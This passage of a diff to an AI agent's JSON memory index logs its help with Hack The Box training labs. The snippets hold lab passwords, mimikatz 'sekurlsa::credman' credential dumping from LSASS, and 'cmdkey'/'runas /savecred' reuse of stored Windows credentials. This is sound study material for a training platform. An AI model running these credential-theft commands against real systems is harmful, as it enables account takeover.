@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "updatedAt": "2026-04-17T06:59:38.638Z",
+  "updatedAt": "2026-04-17T22:46:31.682Z",
   "entries": {
     "memory:memory/2026-04-09.md:4:4": {
       "key": "memory:memory/2026-04-09.md:4:4",
@@ -2584,20 +2584,22 @@
       "endLine": 87,
       "source": "memory",
       "snippet": "5. Credential reuse is common — try discovered creds everywhere ### Documentation Status - ✅ recon.md — API endpoints, services enumerated - ✅ exploit.md — IDOR + Command injection documented - ✅ privesc.md — Admin access obtained, root pending ### Notes - Box is well-designed with chained vulnerabilities - No CVE exploitation needed — pure logic flaws - Root escalation likely requires further enumeration (capabilities, cron, etc.) --- *Session paused — will continue root escalation on return*",
-      "recallCount": 2,
+      "recallCount": 3,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 0.8000748038291932,
-      "maxScore": 0.4168430894613266,
+      "totalScore": 1.2951091021299361,
+      "maxScore": 0.4950342983007431,
       "firstRecalledAt": "2026-04-11T13:03:28.043Z",
-      "lastRecalledAt": "2026-04-12T02:17:14.911Z",
+      "lastRecalledAt": "2026-04-17T22:42:34.125Z",
       "queryHashes": [
         "214e7d8dce8b",
-        "188d0b429921"
+        "188d0b429921",
+        "d0424c2b95db"
       ],
       "recallDays": [
         "2026-04-11",
-        "2026-04-12"
+        "2026-04-12",
+        "2026-04-18"
       ],
       "conceptTags": [
         "recon.md",
@@ -2855,14 +2857,15 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "01679c334ef2"
       ],
       "recallDays": [
         "2026-04-12",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "10.129.202.41",
@@ -2888,14 +2891,15 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "01679c334ef2"
       ],
       "recallDays": [
         "2026-04-12",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "10.129.202.41",
@@ -2921,14 +2925,15 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "01679c334ef2"
       ],
       "recallDays": [
         "2026-04-12",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "accounts.dbo.devsacc",
@@ -2953,14 +2958,15 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "01679c334ef2"
       ],
       "recallDays": [
         "2026-04-12",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "alex.g",
@@ -2986,14 +2992,15 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "01679c334ef2"
       ],
       "recallDays": [
         "2026-04-12",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "htb",
@@ -3019,14 +3026,15 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "01679c334ef2"
       ],
       "recallDays": [
         "2026-04-12",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "10.129.202.20",
@@ -3237,7 +3245,7 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "ed3026e16517"
       ],
@@ -3247,7 +3255,8 @@
         "2026-04-13",
         "2026-04-14",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "reflections",
@@ -3269,7 +3278,7 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-12T19:00:02.897Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "ed3026e16517"
       ],
@@ -3279,7 +3288,8 @@
         "2026-04-13",
         "2026-04-14",
         "2026-04-15",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "possible",
@@ -23365,13 +23375,14 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-13T14:22:34.468Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "0dac2e09ca9b"
       ],
       "recallDays": [
         "2026-04-13",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "0.91",
@@ -23397,13 +23408,14 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-13T14:22:34.468Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "0dac2e09ca9b"
       ],
       "recallDays": [
         "2026-04-13",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "10.129.231.149",
@@ -23429,13 +23441,14 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-13T14:22:34.468Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "0dac2e09ca9b"
       ],
       "recallDays": [
         "2026-04-13",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "154.57.164.68",
@@ -23461,13 +23474,14 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-13T14:22:34.468Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "0dac2e09ca9b"
       ],
       "recallDays": [
         "2026-04-13",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "154.57.164.79",
@@ -23493,13 +23507,14 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-13T14:22:34.468Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "0dac2e09ca9b"
       ],
       "recallDays": [
         "2026-04-13",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "robots.txt",
@@ -23525,13 +23540,14 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-13T14:22:34.468Z",
-      "lastRecalledAt": "2026-04-16T19:00:03.685Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "0dac2e09ca9b"
       ],
       "recallDays": [
         "2026-04-13",
-        "2026-04-16"
+        "2026-04-16",
+        "2026-04-17"
       ],
       "conceptTags": [
         "pre-compaction",
@@ -24286,12 +24302,13 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-14T19:03:12.325Z",
-      "lastRecalledAt": "2026-04-14T19:03:12.325Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "11d1361acb2d"
       ],
       "recallDays": [
-        "2026-04-14"
+        "2026-04-14",
+        "2026-04-17"
       ],
       "conceptTags": [
         "0.90",
@@ -24317,12 +24334,13 @@
       "totalScore": 0.62,
       "maxScore": 0.62,
       "firstRecalledAt": "2026-04-14T19:03:12.325Z",
-      "lastRecalledAt": "2026-04-14T19:03:12.325Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
       "queryHashes": [
         "11d1361acb2d"
       ],
       "recallDays": [
-        "2026-04-14"
+        "2026-04-14",
+        "2026-04-17"
       ],
       "conceptTags": [
         "10.129.231.149",
@@ -27920,18 +27938,21 @@
       "endLine": 435,
       "source": "memory",
       "snippet": "- # 2026-04-02 - Daily Log ## HTB: Cicada Box - Current State **Session Ended:** Continuing later ### Target - **IP:** 10.129.231.149 - **Hostname:** cicada.htb - **OS:** Windows Server 2022 (Domain Controller) - **Status:** Enumeration phase, credentials chain discovered ### Credentials Discovered | User | Password | Source | Status | |------|----------|--------|--------| | michael.wrightson | `Cicada$M6Corpb*@Lp#nZp!8` | HR share (default creds) | Valid SMB | | david.orelious | `aRt$Lp#7t*VQ!3` | AD description field | Valid SMB | | emily.oscars | `Q!3@Lp#M6b*7t*Vt` | Backup_script.ps1 | **UNTESTED** | ### Attack Path So Far 1. ✅ Anonymous SMB access to HR share → found default password [c",
-      "recallCount": 1,
+      "recallCount": 3,
       "dailyCount": 0,
       "groundedCount": 0,
-      "totalScore": 0.516033798456192,
-      "maxScore": 0.516033798456192,
+      "totalScore": 1.5418411865830421,
+      "maxScore": 0.5297693327069282,
       "firstRecalledAt": "2026-04-17T04:41:42.841Z",
-      "lastRecalledAt": "2026-04-17T04:41:42.841Z",
+      "lastRecalledAt": "2026-04-17T22:46:31.682Z",
       "queryHashes": [
-        "c3c63a430170"
+        "c3c63a430170",
+        "d0424c2b95db",
+        "0a939375f682"
       ],
       "recallDays": [
-        "2026-04-17"
+        "2026-04-17",
+        "2026-04-18"
       ],
       "conceptTags": [
         "backup",
@@ -27942,6 +27963,1618 @@
         "emily.oscars",
         "backup-script.ps1",
         "log"
+      ]
+    },
+    "memory:memory/2026-04-17.md:483:486": {
+      "key": "memory:memory/2026-04-17.md:483:486",
+      "path": "memory/2026-04-17.md",
+      "startLine": 483,
+      "endLine": 486,
+      "source": "memory",
+      "snippet": "Reflections: Theme: `assistant` kept surfacing across 396 memories.; confidence: 0.90; evidence: memory/.dreams/session-corpus/2026-04-09.txt:2-2, memory/.dreams/session-corpus/2026-04-09.txt:4-4, memory/.dreams/session-corpus/2026-04-09.txt:7-7; note: reflection",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "500c0eda9949"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "0.90",
+        "2-2",
+        "4-4",
+        "7-7",
+        "reflections",
+        "theme",
+        "assistant",
+        "kept"
+      ]
+    },
+    "memory:memory/2026-04-17.md:489:491": {
+      "key": "memory:memory/2026-04-17.md:489:491",
+      "path": "memory/2026-04-17.md",
+      "startLine": 489,
+      "endLine": 491,
+      "source": "memory",
+      "snippet": "Possible Lasting Truths: # 2026-04-09 — HTB: Administrator ## Session Summary Scaffolded and progressed through HTB box **Administrator** (10.129.245.95). ## Progress Log ### Recon - Target: Windows Server 2022 Domain Controller (hostname: DC, domain: `administrator.htb`) - Open",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.62,
+      "maxScore": 0.62,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "500c0eda9949"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "10.129.245.95",
+        "administrator.htb",
+        "possible",
+        "lasting",
+        "truths",
+        "htb",
+        "administrator",
+        "summary"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:1:1": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:1:1",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 1,
+      "endLine": 1,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3683\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 12:41 GMT+8\", \"was_mentioned\": true } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (815",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "was-mentioned",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:2:2": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:2:2",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 2,
+      "endLine": 2,
+      "source": "memory",
+      "snippet": "Assistant: I'll scaffold the **Password Attacks - Attacking Windows Credential Manager** lab workspace.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "i'll",
+        "scaffold",
+        "the",
+        "password",
+        "attacks",
+        "attacking",
+        "windows"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:3:3": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:3:3",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 3,
+      "endLine": 3,
+      "source": "memory",
+      "snippet": "Assistant: Workspace scaffolded. Let me fix the file structure (the script creates directories instead of files — known bug).",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "scaffolded",
+        "let",
+        "fix",
+        "the",
+        "structure",
+        "script",
+        "creates"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:4:4": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:4:4",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 4,
+      "endLine": 4,
+      "source": "memory",
+      "snippet": "Assistant: Workspace scaffolded and files created. Let me verify the structure:",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "scaffolded",
+        "created",
+        "let",
+        "verify",
+        "the",
+        "structure"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:5:5": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:5:5",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 5,
+      "endLine": 5,
+      "source": "memory",
+      "snippet": "Assistant: **Workspace scaffolded for Password Attacks: Attacking Windows Credential Manager** ``` htb/academy/password-attacks-credential-manager/ ├── module.md ✅ Overview + 4 sections + DPAPI concepts + tools ├── exercises.md ✅ Exercise answers (vault locations, credential type",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "module.md",
+        "exercises.md",
+        "assistant",
+        "scaffolded",
+        "password",
+        "attacks",
+        "attacking",
+        "windows"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:6:6": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:6:6",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 6,
+      "endLine": 6,
+      "source": "memory",
+      "snippet": "User: [Queued messages while agent was busy] --- Queued #1 Conversation info (untrusted metadata): ```json { \"message_id\": \"3687\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 12:41 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"la",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "queued",
+        "messages",
+        "while",
+        "was",
+        "busy"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:7:7": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:7:7",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 7,
+      "endLine": 7,
+      "source": "memory",
+      "snippet": "Assistant: More module content received — this shows **mimikatz `sekurlsa::credman`** extracting credentials from memory (user `mcharles` with cached OneDrive creds). **Key technique here:** ```bash mimikatz.exe privilege::debug sekurlsa::credman ``` This dumps Credential Manager",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "mimikatz.exe",
+        "assistant",
+        "module",
+        "content",
+        "received",
+        "shows",
+        "mimikatz",
+        "sekurlsa"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:8:8": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:8:8",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 8,
+      "endLine": 8,
+      "source": "memory",
+      "snippet": "Assistant: More module content received — this shows **mimikatz `sekurlsa::credman`** extracting credentials from memory (user `mcharles` with cached OneDrive creds). **Key technique here:** ```bash mimikatz.exe privilege::debug sekurlsa::credman ``` This dumps Credential Manager",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "mimikatz.exe",
+        "assistant",
+        "module",
+        "content",
+        "received",
+        "shows",
+        "mimikatz",
+        "sekurlsa"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:9:9": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:9:9",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 9,
+      "endLine": 9,
+      "source": "memory",
+      "snippet": "User: [Queued messages while agent was busy] --- Queued #1 Conversation info (untrusted metadata): ```json { \"message_id\": \"3684\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 12:41 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"la",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "queued",
+        "messages",
+        "while",
+        "was",
+        "busy"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:10:10": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:10:10",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 10,
+      "endLine": 10,
+      "source": "memory",
+      "snippet": "Assistant: Excellent — more techniques from the module: **Credential enumeration via `cmdkey`:** ```cmd cmdkey /list ``` Shows stored credentials including domain passwords with `/savecred` persistence. **Reusing stored credentials:** ```cmd runas /savecred /user:SRV01\\mcharles c",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "excellent",
+        "techniques",
+        "the",
+        "module",
+        "credential",
+        "enumeration",
+        "via"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:11:11": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:11:11",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 11,
+      "endLine": 11,
+      "source": "memory",
+      "snippet": "Assistant: Cheatsheet already updated with all the new techniques: - ✅ `cmdkey /list` — enumerate stored credentials - ✅ `runas /savecred` — reuse stored creds without password - ✅ `sekurlsa::credman` — dump from LSASS memory - ✅ **Web Credentials** vs **Windows Credentials** dis",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "cheatsheet",
+        "already",
+        "updated",
+        "all",
+        "the",
+        "new",
+        "techniques"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:12:12": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:12:12",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 12,
+      "endLine": 12,
+      "source": "memory",
+      "snippet": "Assistant: Excellent — more techniques from the module: **Credential enumeration via `cmdkey`:** ```cmd cmdkey /list ``` Shows stored credentials including domain passwords with `/savecred` persistence. **Reusing stored credentials:** ```cmd runas /savecred /user:SRV01\\mcharles c",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "excellent",
+        "techniques",
+        "the",
+        "module",
+        "credential",
+        "enumeration",
+        "via"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:13:13": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:13:13",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 13,
+      "endLine": 13,
+      "source": "memory",
+      "snippet": "Assistant: Cheatsheet already updated with all the new techniques: - ✅ `cmdkey /list` — enumerate stored credentials - ✅ `runas /savecred` — reuse stored creds without password - ✅ `sekurlsa::credman` — dump from LSASS memory - ✅ **Web Credentials** vs **Windows Credentials** dis",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "cheatsheet",
+        "already",
+        "updated",
+        "all",
+        "the",
+        "new",
+        "techniques"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:14:14": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:14:14",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 14,
+      "endLine": 14,
+      "source": "memory",
+      "snippet": "Assistant: ⚠️ 📝 Edit: `in ~/.openclaw/workspace-neo/htb/academy/password-attacks-credential-manager/cheatsheet.md` failed: Could not find the exact text in /home/openclaw/.openclaw/workspace-neo/htb/academy/password-attacks-credential-manager/cheatsheet.md. The old text must mat",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "assistant",
+        "edit",
+        "openclaw",
+        "neo",
+        "htb",
+        "academy",
+        "password"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:15:15": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:15:15",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 15,
+      "endLine": 15,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_78---f7d8de3e-9fef-437e-82a5-2f372c4d3211.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_78---f7d8de3e-9fef-437e-82a5-2f372c4d3211.jpg] To send an image back, prefer the message tool (media/path/fi",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-78",
+        "image/jpeg",
+        "media/path/fi",
+        "user",
+        "media",
+        "attached",
+        "home"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:16:16": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:16:16",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 16,
+      "endLine": 16,
+      "source": "memory",
+      "snippet": "Assistant: I see the target now: `10.129.234.171` as `sadams` / `totally2brow2harmon@` You found the stored credential for `SRV01\\mcharles`. But before jumping to UAC bypass — **try the simpler path first:** ## Use the stored credential directly ```cmd runas /savecred /user:SRV01",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "10.129.234.171",
+        "assistant",
+        "see",
+        "the",
+        "target",
+        "now",
+        "sadams",
+        "totally2brow2harmon"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:17:17": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:17:17",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 17,
+      "endLine": 17,
+      "source": "memory",
